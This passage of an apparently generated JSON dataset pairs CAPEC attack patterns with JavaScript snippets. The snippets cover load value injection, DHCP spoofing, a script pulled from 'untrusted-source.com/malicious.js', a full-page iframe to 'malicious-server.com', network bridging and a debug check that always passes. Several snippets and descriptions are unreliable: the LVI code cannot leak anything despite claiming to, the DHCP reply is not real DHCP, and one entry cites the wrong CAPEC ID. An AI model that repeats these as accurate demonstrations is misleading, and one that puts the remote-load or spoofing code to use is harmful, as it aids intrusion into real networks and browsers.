        "code_snippet": "function loadValueInjection() {\n  let secret = 'SensitiveData';\n  let buffer = new ArrayBuffer(64);\n  let view = new DataView(buffer);\n\n  // Simulate a page fault or microcode assist\n  try {\n    // This will cause an exception, simulating a faulting load\n    view.getInt32(1000);\n  } catch (e) {\n    // Transient execution: access adversary-controlled data\n    let adversaryData = 'AdversaryControlledData';\n    // Use the adversary data in a transient operation\n    let temp = adversaryData.charCodeAt(0);\n  }\n\n  // Side-channel analysis to infer the secret\n  let inferredSecret = '';\n  for (let i = 0; i < secret.length; i++) {\n    if (buffer[i] === secret.charCodeAt(i)) {\n      inferredSecret += String.fromCharCode(buffer[i]);\n    }\n  }\n\n  console.log('Inferred Secret:', inferredSecret);\n}\n\nloadValueInjection();",
        "description": "This JavaScript code snippet simulates a Load Value Injection (LVI) attack. The function `loadValueInjection` contains a secret value and an ArrayBuffer to simulate memory. A DataView is used to access the buffer, and a try-catch block simulates a page fault or microcode assist by attempting to read an out-of-bounds memory location, causing an exception. During the transient execution phase, adversary-controlled data is accessed and used in a transient operation. Finally, a side-channel analysis is performed to infer the secret value by comparing the buffer contents with the secret. This code represents the main idea of exploiting transient execution to leak sensitive information, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  const message = msg.toString();\n  if (message.includes('DHCPDISCOVER')) {\n    const spoofedOffer = Buffer.from('DHCPOFFER: Spoofed Server');\n    server.send(spoofedOffer, 0, spoofedOffer.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending spoofed offer:', err);\n    });\n  }\n});\n\nserver.bind(67, () => {\n  console.log('DHCP Spoofing server listening on port 67');\n});",
        "description": "This JavaScript code snippet demonstrates a basic DHCP spoofing attack using the 'dgram' module to create a UDP server. The server listens for DHCPDISCOVER messages on port 67, which is the standard port for DHCP servers. When a DHCPDISCOVER message is received, the server responds with a spoofed DHCPOFFER message, pretending to be a legitimate DHCP server. This can redirect network traffic or deny service to the actual DHCP server. The code embodies the main idea of CAPEC-290 (DHCP Spoofing) and highlights related CWEs such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-290 (Authentication Bypass by Spoofing) by demonstrating how an attacker can exploit these weaknesses to perform a spoofing attack."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "function loadMaliciousExtension() {\n  const script = document.createElement('script');\n  script.src = 'http://untrusted-source.com/malicious.js';\n  document.head.appendChild(script);\n}\n\n// Simulate user action to install the extension\nloadMaliciousExtension();",
        "description": "This JavaScript code snippet demonstrates the installation of a malicious extension by dynamically loading a script from an untrusted source. The function 'loadMaliciousExtension' creates a new script element and sets its source to a URL that is outside the trusted control sphere (CWE-829). The script is then appended to the document's head, causing it to be executed without any integrity checks (CWE-494). This represents a Trojan Horse scenario (CWE-507) where the extension appears to be benign but contains hidden malicious code (CWE-506). Additionally, the code does not verify the origin or integrity of the script, making it vulnerable to inclusion of malicious functionality."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "const sensitiveData = 'This is sensitive information';\n\n// Simulate cleartext transmission of sensitive data\nfunction transmitData(data) {\n  console.log('Transmitting data:', data);\n}\n\n// Simulate improper protection of physical side channels\nfunction emitElectromagneticSignal(data) {\n  // This function simulates the emission of an electromagnetic signal\n  // that could be captured by an attacker\n  console.log('Emitting electromagnetic signal for data:', data);\n}\n\n// Simulate improper management of sensitive trace data\nfunction storeTraceData(data) {\n  // Storing trace data in an unprotected location\n  localStorage.setItem('traceData', data);\n}\n\n// Main function to demonstrate the vulnerability\nfunction main() {\n  transmitData(sensitiveData);\n  emitElectromagneticSignal(sensitiveData);\n  storeTraceData(sensitiveData);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Eavesdropping on a Monitor' by simulating the transmission and storage of sensitive data without proper protection. The 'transmitData' function represents the cleartext transmission of sensitive information (CWE-319). The 'emitElectromagneticSignal' function simulates the emission of electromagnetic signals that could be captured by an attacker (CWE-1300). The 'storeTraceData' function shows the improper management of sensitive trace data by storing it in an unprotected location (CWE-1323). The 'main' function ties these elements together, illustrating how an adversary could exploit these weaknesses to eavesdrop on sensitive information."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "const net = require('net');\n\nconst trustedNetwork = '192.168.1.0/24';\nconst untrustedNetwork = '10.0.0.0/24';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper restriction of communication channel to intended endpoints (CWE-923)\n    if (isTrustedEndpoint(socket.remoteAddress)) {\n      // Trust boundary violation (CWE-501)\n      forwardToUntrustedNetwork(data);\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0');\n\nfunction isTrustedEndpoint(ip) {\n  // Simplified check for trusted network\n  return ip.startsWith('192.168.1.');\n}\n\nfunction forwardToUntrustedNetwork(data) {\n  const client = new net.Socket();\n  client.connect(8081, '10.0.0.1', () => {\n    client.write(data);\n  });\n}",
        "description": "This JavaScript code snippet creates a TCP server that listens for incoming connections. When data is received from a trusted network (192.168.1.0/24), it forwards the data to an untrusted network (10.0.0.0/24). The code demonstrates several vulnerabilities: it does not properly restrict communication channels to intended endpoints (CWE-923), mixes trusted and untrusted data (CWE-501), and does not ensure message integrity during transmission (CWE-924). This setup can be exploited by an adversary to bridge trusted and untrusted networks, embodying the main idea of the CAPEC 'Network Boundary Bridging'."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "const remoteDesktopUrl = 'http://malicious-server.com/remote-desktop';\n\nfunction loadRemoteDesktop() {\n  const iframe = document.createElement('iframe');\n  iframe.src = remoteDesktopUrl;\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  document.body.appendChild(iframe);\n}\n\n// Simulate user action to load the remote desktop\nwindow.onload = function() {\n  loadRemoteDesktop();\n};",
        "description": "This JavaScript code snippet demonstrates a Browser in the Middle (BiTM) attack. When the victim's browser loads the page, it creates an iframe that points to a remote desktop session hosted on a malicious server. This iframe takes up the entire viewport, effectively embedding the remote desktop session within the victim's browser. The code leverages CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by embedding an iframe from an untrusted domain. This setup can lead to various security issues, such as CWE-294 (Authentication Bypass by Capture-replay) if the remote desktop session is not properly secured, CWE-345 (Insufficient Verification of Data Authenticity) if the data from the remote desktop is not verified, and CWE-602 (Client-Side Enforcement of Server-Side Security) if the security mechanisms are enforced on the client side rather than the server side."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent {\n  constructor() {\n    this.debugAccess = false;\n  }\n\n  enableDebug() {\n    if (this.checkAuthorization()) {\n      this.debugAccess = true;\n      console.log('Debug access enabled');\n    } else {\n      console.log('Unauthorized access attempt');\n    }\n  }\n\n  checkAuthorization() {\n    // Incorrectly assuming authorization for a group of functionalities\n    return true; // This should be a proper authorization check\n  }\n\n  accessInternalRegister() {\n    if (this.debugAccess) {\n      console.log('Accessing internal register');\n      // Access internal register logic\n    } else {\n      console.log('Unauthorized access to internal register');\n    }\n  }\n}\n\nconst debugComponent = new DebugComponent();\ndebugComponent.enableDebug();\ndebugComponent.accessInternalRegister();",
        "description": "This JavaScript code snippet represents a simplified version of a hardware debug component with incorrect chaining or granularity of debug functionalities. The `DebugComponent` class has a method `enableDebug` that enables debug access based on an authorization check. However, the `checkAuthorization` method incorrectly assumes authorization for a group of functionalities by always returning true. This represents CWE-1296 and CWE-1191, where improper access control and incorrect chaining of debug components can lead to unauthorized access. The `accessInternalRegister` method demonstrates how an attacker could exploit this flaw to access internal registers without proper authorization."
    }
]